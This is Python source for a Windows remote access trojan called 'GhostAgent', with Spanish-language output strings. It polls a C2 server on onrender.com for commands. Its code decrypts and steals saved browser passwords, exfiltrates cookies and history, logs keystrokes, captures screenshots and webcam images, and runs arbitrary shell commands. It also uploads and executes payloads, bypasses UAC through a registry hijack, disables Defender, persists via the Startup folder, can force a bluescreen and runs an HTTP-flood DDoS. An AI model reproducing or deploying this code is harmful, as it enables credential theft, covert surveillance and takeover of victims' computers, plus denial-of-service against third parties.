import requests
import os
import platform
import time
import uuid
import ctypes
import json
import sqlite3
import base64
import shutil
import sys
import winreg
import glob
import webbrowser
import pyperclip
import cv2
import pyautogui
import pyttsx3
import struct
import subprocess
from threading import Thread
from pynput import keyboard
from mss import mss
from datetime import datetime
try:
    import win32crypt
except ImportError:
    pass
from Cryptodome.Cipher import AES

# --- GHOST-C2 CONFIG ---
C2_URL = "https://test-ikqa.onrender.com/" 
AGENT_ID = str(uuid.uuid4())[:8]
SECRET_TOKEN = "GHOST_SIGMA_99" 

class GhostAgent:
    def __init__(self):
        self.id = AGENT_ID
        self.base_url = f"{C2_URL}/api/v1/agent"
        self.headers = {"X-Ghost-Token": SECRET_TOKEN}
        self.keylog_data = ""
        self.keylogger_listener = None
        self.selected_cam = 0

    def register(self):
        payload = {
            "id": self.id,
            "hostname": os.getlogin(),
            "os": f"{platform.system()} {platform.release()}"
        }
        try: requests.post(f"{self.base_url}/register", json=payload, headers=self.headers, timeout=5)
        except: pass

    def send_result(self, text):
        payload = {"id": self.id, "result": text}
        try: requests.post(f"{self.base_url}/result", json=payload, headers=self.headers, timeout=5)
        except: pass

    def get_master_key(self, path):
        if not os.path.exists(path): return None
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            import win32crypt
            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        except: return None

    def decrypt_password(self, buff, key):
        try:
            # Buffer: [v10/v11 (3 bytes)][IV (12 bytes)][Payload (var)][Tag (16 bytes)]
            prefix = buff[:3]
            if prefix == b'v10' or prefix == b'v11':
                iv = buff[3:15]
                payload = buff[15:-16]
                tag = buff[-16:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt_and_verify(payload, tag).decode()
            else:
                import win32crypt
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception as e:
            return f"(D-Err: {str(e)})"

    def steal_passwords(self):
        output = "--- REPORTE DE CREDENCIALES ---\n"
        appdata = os.getenv("LOCALAPPDATA")
        roaming = os.getenv("APPDATA")
        browsers = {
            'chrome': os.path.join(appdata, "Google", "Chrome", "User Data"),
            'edge': os.path.join(appdata, "Microsoft", "Edge", "User Data"),
            'brave': os.path.join(appdata, "BraveSoftware", "Brave-Browser", "User Data"),
            'avast': os.path.join(appdata, "AVAST Software", "Browser", "User Data"),
            'vivaldi': os.path.join(appdata, "Vivaldi", "User Data"),
            'yandex': os.path.join(appdata, "Yandex", "YandexBrowser", "User Data"),
            'opera': os.path.join(roaming, "Opera Software", "Opera Stable"),
            'opera_gx': os.path.join(roaming, "Opera Software", "Opera GX Stable"),
            'coccoc': os.path.join(appdata, "CocCoc", "Browser", "User Data")
        }
        for name, path in browsers.items():
            if not os.path.exists(path): continue
            master_key = self.get_master_key(os.path.join(path, "Local State"))
            if not master_key: continue
            profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Guest Profile", "."]
            for p in profiles:
                login_db = os.path.join(path, p, "Login Data")
                if not os.path.exists(login_db): continue
                temp_db = os.path.join(os.environ["TEMP"], f"sq_{str(uuid.uuid4())[:4]}")
                try:
                    shutil.copyfile(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, user, cryp_pass = row
                        if not user and not cryp_pass: continue
                        dec_pass = self.decrypt_password(cryp_pass, master_key)
                        output += f"[{name.upper()}] URL: {url}\nU: {user}\nP: {dec_pass}\n{'-'*15}\n"
                    conn.close()
                    os.remove(temp_db)
                except: continue
        return output if len(output) > 40 else "No se encontraron credenciales."

    def steal_cookies(self):
        import zipfile
        output_zip = os.path.join(os.environ["TEMP"], f"cookies_{str(uuid.uuid4())[:4]}.zip")
        cookies_found = False
        
        with zipfile.ZipFile(output_zip, 'w') as zf:
            appdata = os.getenv("LOCALAPPDATA")
            roaming = os.getenv("APPDATA")
            browsers = {
                'chrome': os.path.join(appdata, "Google", "Chrome", "User Data"),
                'edge': os.path.join(appdata, "Microsoft", "Edge", "User Data"),
                'brave': os.path.join(appdata, "BraveSoftware", "Brave-Browser", "User Data"),
                'opera': os.path.join(roaming, "Opera Software", "Opera Stable"),
                'opera_gx': os.path.join(roaming, "Opera Software", "Opera GX Stable")
            }
            
            for b_name, b_path in browsers.items():
                if not os.path.exists(b_path): continue
                profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "."]
                for p in profiles:
                    cookie_path = os.path.join(b_path, p, "Network", "Cookies")
                    if b_name.startswith("opera"): cookie_path = os.path.join(b_path, "Network", "Cookies") # Opera fix
                    
                    if os.path.exists(cookie_path):
                        temp_cookie = os.path.join(os.environ["TEMP"], f"c_{b_name}_{p.replace(' ','_')}")
                        try:
                            shutil.copyfile(cookie_path, temp_cookie)
                            zf.write(temp_cookie, f"{b_name}_{p}/Cookies")
                            os.remove(temp_cookie)
                            cookies_found = True
                        except: pass
        
        if cookies_found:
            with open(output_zip, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            os.remove(output_zip)
            return f"[FILE_DATA:all_cookies.zip]{data}"
        return "No se encontraron cookies."

    def get_history(self):

        output = "--- HISTORIAL DE NAVEGACIÓN ---\n"
        appdata = os.getenv("LOCALAPPDATA")
        browsers = {
            'chrome': os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "History"),
            'edge': os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "History"),
            'brave': os.path.join(appdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
        }
        for name, path in browsers.items():
            if not os.path.exists(path): continue
            temp_db = os.path.join(os.environ["TEMP"], f"his_{str(uuid.uuid4())[:4]}")
            try:
                shutil.copyfile(path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
                for row in cursor.fetchall():
                    output += f"[{name.upper()}] {row[1]} -> {row[0]}\n"
                conn.close()
                os.remove(temp_db)
            except: pass
        return output

    def run_cmd(self, cmd):
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('CP437', errors='ignore')
        except Exception as e:
            return str(e)

    def show_message(self, text):
        def _msg():
            ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0x40 | 0x1)
        Thread(target=_msg).start()
        return "Mensaje mostrado"

    def webcam_pic(self):
        try:
            cap = cv2.VideoCapture(self.selected_cam)
            ret, frame = cap.read()
            cap.release()
            if not ret: return "Error webcam"
            _, buffer = cv2.imencode('.jpg', frame)
            img_str = base64.b64encode(buffer).decode()
            return f"[IMAGE_DATA]{img_str}"
        except: return "Error webcam"

    def speak(self, text):
        def _speak():
            try:
                engine = pyttsx3.init()
                engine.say(text)
                engine.runAndWait()
            except: pass
        Thread(target=_speak).start()
        return "Hablando..."

    def set_wallpaper(self, path):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(path), 3)
            return "Fondo cambiado"
        except Exception as e: return f"Error: {e}"

    def keylogger_start(self):
        if self.keylogger_listener: return "Ya está corriendo"
        def on_press(key):
            try: self.keylog_data += f"{key.char}"
            except: self.keylog_data += f"[{str(key)}]"
        self.keylogger_listener = keyboard.Listener(on_press=on_press)
        self.keylogger_listener.start()
        return "Keylogger iniciado"

    def keylogger_stop(self):
        if self.keylogger_listener:
            self.keylogger_listener.stop()
            self.keylogger_listener = None
            return "Keylogger detenido"
        return "No estaba corriendo"

    def get_help_list(self):
        return """
Available commands are :
--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !cd = Changes directory
--> !dir = display all items in current dir
--> !download = Download a file from infected computer
--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
--> !uploadlink = Upload file to the infected computer / Syntax = "!upload link file.png"
--> !delete = deletes a file / Syntax = "!delete / path to / the / file.txt"
--> !write = Type your desired sentence on computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !idletime = Get the idle time of user's on target computer
--> !currentdir = display the current dir
--> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui
--> !shutdown = shutdown computer
--> !restart = restart computer
--> !logoff = log off current user
--> !bluescreen = BlueScreen PC
--> !datetime = display system date and time
--> !prockill = kill a process by name / syntax = "!kill process"
--> !disabledefender = Disable windows defender(requires admin)
--> !disablefirewall = Disable windows firewall(requires admin)
--> !audio = play a audio file on the target computer / Syntax = "!audio" (with attachment)
--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
--> !website = open a website on the infected computer / syntax = "!website www.google.com"
--> !disabletaskmgr = disable task manager(Admin rights are required)
--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)
--> !startup = add to startup(when computer go on this file starts)
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !listprocess = Get all process's
--> !password = grab all passwords
--> !cookies = grab all cookies and zip them
--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
--> !unrootkit = Remove the rootkit(Admin rights are required)
--> !getcams = Grab the cameras names and their respected selection number
--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
--> !webcampic = Take a picture out of the selected webcam
--> !grabtokens = Grab all discord tokens on the current pc
--> !help = This help menu
"""


    def screenshot(self):
        with mss() as sct:
            filename = os.path.join(os.environ["TEMP"], "sc.png")
            sct.shot(mon=-1, output=filename)
            with open(filename, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            return f"[IMAGE_DATA]{data}"

    def ddos_attack(self, target, duration):
        if not target.startswith("http"): target = "http://" + target
        def _attack():
            s = requests.Session()
            end_time = time.time() + int(duration)
            while time.time() < end_time:
                try: s.get(target, timeout=1, verify=False)
                except: pass
        for _ in range(100):
            try:
                t = Thread(target=_attack)
                t.daemon = True
                t.start()
            except: break
        return f"🔥 ATAQUE INICIADO -> {target}"

    def uac_bypass(self):
        try:
            path = sys.executable
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command")
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            subprocess.Popen("computerdefaults.exe", shell=True)
            return "UAC Bypass intentado"
        except Exception as e: return str(e)

    def process_command(self, cmd):
        if cmd.startswith("!"): cmd = cmd[1:]
        args = cmd.split(" ")
        base = args[0].lower()
        rest = " ".join(args[1:])

        if base == "message": return self.show_message(rest)
        if base == "shell": return self.run_cmd(rest)
        if base == "voice": return self.speak(rest)
        if base == "admincheck": return "SI" if ctypes.windll.shell32.IsUserAnAdmin() else "NO"
        if base == "sysinfo": return f"User: {os.getlogin()}\nOS: {platform.platform()}"
        if base == "history": return self.get_history()
        if base == "cd": 
            try: os.chdir(rest); return os.getcwd()
            except Exception as e: return str(e)
        if base == "dir": return "\n".join(os.listdir())
        if base == "currentdir": return os.getcwd()
        if base == "delete":
            try: os.remove(rest); return "Eliminado"
            except Exception as e: return str(e)
        if base == "download":
            try:
                with open(rest, "rb") as f: return f"[FILE_DATA:{os.path.basename(rest)}]{base64.b64encode(f.read()).decode()}"
            except Exception as e: return str(e)
        if base == "upload":
            try:
                with open(args[1], "wb") as f: f.write(base64.b64decode(args[2]))
                return "Subido"
            except Exception as e: return str(e)
        if base == "upload_exe":
            try:
                path = os.path.join(os.environ["TEMP"], args[1])
                with open(path, "wb") as f: f.write(base64.b64decode(args[2]))
                subprocess.Popen(path, shell=True)
                return f"Subido y ejecutado: {args[1]}"
            except Exception as e: return str(e)

        if base == "wallpaper_file":
            try:
                path = os.path.join(os.environ["TEMP"], args[1])
                with open(path, "wb") as f: f.write(base64.b64decode(args[2]))
                return self.set_wallpaper(path)
            except Exception as e: return str(e)
        if base == "clipboard": return pyperclip.paste()
        if base == "idletime":
            class LASTINPUTINFO(ctypes.Structure): _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            lii = LASTINPUTINFO(); lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
            return f"Idle: {(ctypes.windll.kernel32.GetTickCount() - lii.dwTime)/1000}s"
        if base in ["block", "blockinput"]:
            ctypes.windll.user32.BlockInput(True); return "Bloqueado"
        if base in ["unblock", "unblockinput"]:
            ctypes.windll.user32.BlockInput(False); return "Desbloqueado"
        if base == "screenshot": return self.screenshot()
        if base == "exit": sys.exit()
        if base == "uacbypass": return self.uac_bypass()
        if base == "shutdown": os.system("shutdown /s /t 1"); return "S"
        if base == "restart": os.system("shutdown /r /t 1"); return "R"
        if base == "logoff": os.system("shutdown /l"); return "L"
        if base == "bluescreen":
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            except: return "BSOD failed"
        if base == "datetime": return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if base == "prockill": os.system(f"taskkill /f /im {rest}"); return "Killed"
        if base == "disabledefender":
            os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'); return "OFF"
        if base == "website" or base == "browser": webbrowser.open(rest); return "Open"
        if base == "startup":
            try:
                 dest = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Ghost.exe")
                 shutil.copy(sys.executable, dest); return "Startup OK"
            except: return "Startup Error"
        if base == "geolocate":
            try: return requests.get("http://ip-api.com/json").text
            except: return "Err"
        if base == "listprocess": return self.run_cmd("tasklist")
        if base in ["password", "passwords"]: return self.steal_passwords()
        if base == "cookies": return self.steal_cookies()
        if base == "webcampic": return self.webcam_pic()

        if base == "selectcam": self.selected_cam = int(rest); return f"Cam {rest}"
        if base == "help": return self.get_help_list()
        
        if base == "ddos":
            p = rest.split(" ")
            if len(p) >= 2: return self.ddos_attack(p[0], p[1])
        return "Unknown"


    def main_loop(self):
        while True:
            try:
                self.register()
                resp = requests.get(f"{self.base_url}/command/{self.id}", headers=self.headers, timeout=5)
                if resp.status_code == 200:
                    cmd = resp.json().get('command')
                    if cmd:
                        res = self.process_command(cmd)
                        self.send_result(res)
            except: pass
            time.sleep(5)

if __name__ == "__main__":
    def is_admin():
        try: return ctypes.windll.shell32.IsUserAnAdmin()
        except: return False

    if not is_admin():
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    agent = GhostAgent()
    agent.main_loop()

